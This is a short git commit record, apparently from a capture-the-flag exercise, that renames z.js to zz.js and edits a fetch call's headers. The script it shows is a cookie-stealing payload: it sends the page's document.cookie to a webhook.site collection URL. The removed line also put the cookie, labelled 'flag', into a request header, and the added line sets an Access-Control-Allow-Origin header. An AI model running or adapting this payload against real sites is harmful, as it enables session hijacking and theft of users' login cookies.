e80c6dc7879e644cc6164ae16ee0d6b3cffb741b
shyeun <96280288+shyeun@users.noreply.github.com>
2022-01-28 15:28:40 +0900

    Update and rename z.js to zz.js

--- zz.js
+++ zz.js
@@ -2,6 +2,6 @@ fetch('https://webhook.site/fb6f68c3-2ba1-4413-9b6a-eec76e47338b?a='+document.co
   method:'GET',
   mode: 'cors',
   headers: {
-    'Cookie': 'flag=${document.cookie}'
+    'Access-Control-Allow-Origin': '*'
   }
 })
